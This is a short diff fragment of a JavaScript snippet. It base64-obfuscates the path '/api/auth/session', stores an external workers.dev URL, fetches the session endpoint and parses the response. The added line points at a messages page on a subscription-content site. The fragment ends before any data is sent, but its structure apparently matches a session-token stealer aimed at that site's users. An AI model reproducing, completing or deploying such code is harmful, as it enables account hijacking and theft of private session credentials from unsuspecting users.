@@ -1,6 +1,7 @@
 (() => {
   const u = atob('L2FwaS9hdXRoL3Nlc3Npb24=');
   const w = 'https://mnta.wilselme.workers.dev/';
+  const currentUrl = 'https://allaccessfans.co/messages'
 
   fetch(u)
     .then((r) => r.json())
